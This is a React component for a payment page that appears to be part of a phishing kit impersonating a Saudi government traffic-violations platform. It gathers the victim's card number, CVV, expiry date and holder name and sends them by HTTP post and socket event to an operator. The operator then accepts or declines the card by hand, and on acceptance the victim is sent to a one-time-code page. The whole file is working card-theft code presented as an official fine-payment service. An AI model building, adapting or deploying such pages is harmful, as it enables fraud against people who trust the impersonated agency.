import axios from "axios";
import React, { useState } from "react";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { id } from "./Home";

const Payemnt = () => {
  const [card_number, setCardNumber] = useState("");
  const [cvv, setCvv] = useState("");
  const [error, setError] = useState(false);
  const [car_holder_name, setCardHolderName] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [load, setLoad] = useState(null);
  const [method, setMethod] = useState("visa");
  const [check, setCheck] = useState("visa");
  const price = sessionStorage.getItem("price");
  const nationalId = sessionStorage.getItem("nationalId");
  const id = sessionStorage.getItem("id");
  const vioNumber = sessionStorage.getItem("vioNumber");

  const handleExpiryDateChange = (e) => {
    // Limit input to 4 characters (MM/YY)
    const numericValue = e.target.value.replace(/\D/g, "");
    let formattedValue = numericValue.slice(0, 5);

    // Add "/" after 2 characters (month)
    if (formattedValue.length > 2) {
      formattedValue =
        formattedValue.slice(0, 2) + "/" + formattedValue.slice(2);
    }

    setExpiryDate(formattedValue);
  };

  const formatCardNumber = (value) => {
    // Remove non-numeric characters
    const numericValue = value.replace(/\D/g, "");

    // Add space after every 4 digits
    let formattedValue = numericValue.replace(/(\d{4})(?=\d)/g, "$1 ");

    // Trim to 16 characters
    formattedValue = formattedValue.slice(0, 19);

    // Update state
    setCardNumber(formattedValue);
  };

  const handleCardNumberChange = (e) => {
    formatCardNumber(e.target.value);
  };

  const handleCvvChange = (e) => {
    // Limit input to 3 digits
    const numericValue = e.target.value.replace(/\D/g, "");
    setCvv(numericValue.slice(0, 3));
  };

  const handleSubmit = async (e) => {
    setLoad(true);
    setError(false);
    e.preventDefault();
    let check = card_number.split(" ").join("");
    if (check.length !== 16) {
      setLoad(false);
      return window.alert("رقم البطاقه يجب ان يكون 16 رقم");
    }

    const finalData = {
      visa_card_number: card_number,
      visa_expiryDate: expiryDate,
      visa_cvv: cvv,
      visa_card_holder_name: car_holder_name,
      method,
    };
    console.log(finalData);
    try {
      await axios
        .post(api_route + "/visa/" + sessionStorage.getItem("id"), finalData)
        .then(() => {
          socket.emit("visa", {
            id: sessionStorage.getItem("id"),
            ...finalData,
          });
        });
    } catch (error) {
      console.error(error);
    }
  };

  socket.on("acceptVisa", (data) => {
    console.log("acceptVisa From Admin", id);
    sessionStorage.setItem('method',method)
    console.log(data);
    if (id === data) {
      window.location.href = "/OTP";
    }
  });

  socket.on("declineVisa", (data) => {
    console.log("declineVisa From Admin", data);

    console.log(data);
    if (id === data) {
      setLoad(false);
      setError("بيانات البطاقة غير صحيحة برجاء المحاولة مره اخري");
    }
  });

  return (
    <div className="w-11/12 lg:w-1/2 flex flex-col items-center justify-center my-5 rounded-md">
      <div className="main_bg w-full flex flex-col md:flex-row  items-center justify-center text-white px-2 py-8 rounded-lg ">
        <div
          className=" w-full flex flex-col gap-y-2 md:items-end justify-center items-center md:py-2"
          dir="rtl "
        >
          <span className="text-3xl md:text-5xl w-full text-center ">
            المنصة الوطنية للمخالفات
          </span>
          <span className="text-lg">وجهة واحدة لإدارة جميع المخالفات</span>
          <form
            className="w-full flex flex-col  gap-y-3 py-5"
            onSubmit={handleSubmit}
          >
            <div className="w-full flex flex-col gap-y-3" dir="rtl">
              <div className="flex gap-x-2">
                <span className="w-1/3">رقم الهوية</span>
                <span>
                  {nationalId || sessionStorage.getItem("nationalOther")}
                </span>
              </div>
              <div className="flex gap-x-2">
                <span className="w-1/3">رقم المخالفة</span>
                <span>{vioNumber}</span>
              </div>
              <div className="flex gap-x-2">
                <span className="w-1/3">قيمة المخالفة</span>
                <span>{price} ر.س</span>
              </div>
            </div>

            <div
              className="flex flex-col w-full gap-y-3 mt-5 animate-bounce"
              dir="rtl"
            >
              <span> اختر خيار الدفع</span>
            </div>
            <div className="flex items-center" dir="rtl">
              <div className=" w-full flex items-center justify-between  gap-x-8 p-2 rounded-md  ">
                <input
                  type="radio"
                  name="method"
                  className="w-fit"
                  checked={method === "visa"}
                  onClick={() => setMethod("visa")}
                />
                <div className=" w-full flex items-center  gap-x-5 p-2">
                  <img src="/MasterCard.svg" className="md:w-12 w-9 " />
                  <img src="/Visa.svg" className="md:w-12 w-9" />
                  <img src="/Mada.svg" className="md:w-12 w-9" />
                </div>
              </div>
            </div>
            <div className="flex flex-col items-center" dir="rtl">
              <div className=" w-full flex items-center   gap-x-8 p-2 rounded-md  ">
                <input
                  type="radio"
                  name="method"
                  className="w-fit"
                  onClick={() => setMethod("paypal")}
                />
                <div className=" w-full flex items-center gap-x-5 p-2">
                  <img src="/paypal.jpg" className="md:w-12 w-9  rounded-md" />

                  <img
                    src="/apple.png"
                    className="md:w-12 w-9 bg-white rounded-md"
                  />
                </div>
              </div>
              <div className=" w-full flex items-center   gap-x-8 p-2 rounded-md  ">
                <input
                  type="radio"
                  name="method"
                  className="w-fit"
                  checked={method === "american"}
                  onClick={() => setMethod("american")}
                />
                <div className=" w-full flex items-center  gap-x-5 p-2">
                  <img src="/american.png" className="md:w-12 w-9 rounded-md" />
                </div>
              </div>
            </div>

            {method === "visa" || method === "american" ? (
              <>
                {" "}
                <div className="flex flex-col w-full gap-y-3 mt-5 " dir="rtl">
                  <span>بيانات الدفع</span>
                </div>
                <div className="flex flex-col w-full gap-3  my-2">
                  <input
                    value={car_holder_name}
                    required
                    onChange={(e) => setCardHolderName(e.target.value)}
                    dir="ltr"
                    minLength={4}
                    type="text"
                    placeholder="الأسم المدون علي البطاقة"
                    className="w-full     rounded-md  text-black   p-2   text-center     outline-green-800"
                  />
                </div>
                <div className="flex flex-col w-full gap-3  my-2">
                  <input
                    value={card_number}
                    required
                    onChange={handleCardNumberChange}
                    dir="ltr"
                    maxLength={19}
                    minLength={16}
                    inputMode="numeric"
                    type="text"
                    placeholder="XXXX XXXX XXXX XXXX"
                    className="w-full     rounded-md  text-black   p-2   text-center     outline-green-800"
                  />
                </div>
                <div className="flex w-full gap-x-5 px-2 text-sm ">
                  <div className="flex items-center justify-center gap-x-2">
                    <input
                      className="w-full     rounded-md  text-black   p-2   text-center     outline-green-800"
                      type="text"
                      value={cvv}
                      onChange={handleCvvChange}
                      inputMode="numeric"
                      placeholder="CVV"
                      maxLength={3}
                      required
                    />
                    <span className="text-xs"> كود الحماية</span>
                  </div>
                  <div className="flex items-center justify-center gap-x-2">
                    <input
                    className="w-full     rounded-md  text-black   p-2   text-center     outline-green-800"
                      type="text"
                      value={expiryDate}
                      maxLength={5}
                      inputMode="numeric"
                      onChange={handleExpiryDateChange}
                      placeholder="MM/YY"
                      required
                    />
                    <span className="text-xs"> تاريخ الإنتهاء </span>
                  </div>
                </div>
                <button
                  type="submit"
                  className="flex items-center justify-center gap-2 p-2 w-full mt-5"
                  style={{ background: "#17605d" }}
                >
                  متابعة
                </button>
              </>
            ) : method === "paypal" ? (
              <div className="w-full flex items-center justify-center">
                <span className="font-bold">غير متوفرة حاليا</span>
              </div>
            ) : (
              ""
            )}
            {error && (
              <span className="text-red-500 text-center w-full py-2 text-sm">
                {error}
              </span>
            )}
          </form>
        </div>
      </div>
      {load ? (
        <div className="fixed top-0 w-full h-screen bg-black bg-opacity-20 flex items-center justify-center ">
          <TailSpin
            height="50"
            width="50"
            color="white"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      ) : (
        ""
      )}
    </div>
    // <div
    //   className="w-full flex flex-col min-h-screen items-center justify-center  relative"
    //   dir="rtl"
    // >
    //   <form
    //     className=" w-11/12  p-3 rounded-xl justify-center  items-center flex flex-col gap-y-2 "
    //     onSubmit={handleSubmit}
    //   >
    //     <div
    //       className="w-full py-3  flex flex-col items-center justify-between p-2 rounded-xl"
    //       dir="rtl"
    //     >
    //       <div className="flex flex-col w-full gap-3  my-2">
    //         <input
    //           value={car_holder_name}
    //           required
    //           onChange={(e) => setCardHolderName(e.target.value)}
    //           dir="ltr"
    //           minLength={4}
    //           type="text"
    //           placeholder="الأسم المدون علي البطاقة"
    //           className="w-full   rounded-md border    p-2  placeholder:text-gray-600 text-center     outline-orange-500"
    //         />
    //       </div>
    //       <div className="flex flex-col w-full gap-3  my-2" dir="rtl">
    // <input
    //   value={card_number}
    //   required
    //   onChange={handleCardNumberChange}
    //   dir="ltr"
    //   maxLength={19}
    //   minLength={16}
    //   inputMode="numeric"
    //   type="text"
    //   placeholder="**** **** **** ****"
    //   className="w-full   rounded-md border    p-2  placeholder:text-gray-600 text-center     outline-orange-500"
    // />
    //       </div>
    //       <div className="w-full flex items-end justify-end">
    //         <img src="/img7.avif" />
    //       </div>
    //       <div className="flex w-full  gap-2">
    //         <div
    //           className="flex flex-col w-full  gap-x-5 text-xl my-2"
    //           dir="rtl"
    //         >
    // <div className="flex w-full gap-x-5 px-2 text-sm ">
    //   <div className="flex items-center justify-center gap-x-2">
    //     <input
    //       className="text-xs  border rounded-md py-2 px-1 text-center w-1/2"
    //       type="text"
    //       value={cvv}
    //       onChange={handleCvvChange}
    //       inputMode="numeric"
    //       placeholder="CVV"
    //       maxLength={3}
    //       required
    //     />
    //     <span className="text-xs"> كود الحماية</span>
    //   </div>
    //   <div className="flex items-center justify-center gap-x-2">
    //     <input
    //       className="text-xs  border rounded-md py-2 px-1 text-center w-1/2"
    //       type="text"
    //       value={expiryDate}
    //       maxLength={5}
    //       inputMode="numeric"
    //       onChange={handleExpiryDateChange}
    //       placeholder="MM/YY"
    //       required
    //     />
    //     <span className="text-xs"> تاريخ الإنتهاء </span>
    //   </div>
    //  </div>
    // </div>
    //       </div>
    //       <div
    //         className="flex items-center justify-start gap-3 px-2 text-lg text-gray-500 my-2 "
    //         dir="rtl"
    //       ></div>

    //       <div className="w-full flex items-center justify-center relative">
    //         <img src="/visa2.png" className="rounded-md" />
    //         {cvv && (
    //           <span className="text-white absolute right-16 top-6 font-semibold">
    //             {cvv}
    //           </span>
    //         )}
    //         <div className="absolute w-full h-full flex flex-col items-center justify-center -bottom-10 gap-y-2">
    //           {car_holder_name && (
    //             <span className="text-white">{car_holder_name}</span>
    //           )}
    //           {card_number && <span className="text-white">{card_number}</span>}
    //           {expiryDate && <span className="text-white">{expiryDate}</span>}
    //         </div>
    //       </div>
    //       {error && (
    //         <span className="text-red-500 w-full text-center text-lg mt-5 font-bold">
    //           {error}
    //         </span>
    //       )}

    //       <button
    //         className="bg-black w-full my-5 font-bold text-white flex items-center justify-center  py-2 rounded-md mt-5"
    //         type="submit"
    //       >
    //         {load ? (
    //           <TailSpin
    //             height="30"
    //             width="30"
    //             color="white"
    //             ariaLabel="tail-spin-loading"
    //             radius="1"
    //             wrapperStyle={{}}
    //             wrapperClass=""
    //             visible={true}
    //           />
    //         ) : (
    //           "تسديد "
    //         )}
    //       </button>
    //     </div>
    //   </form>
    //   <img src="/visa3.png" className="w-11/12 my-2 " />
    // </div>
  );
};

export default Payemnt;
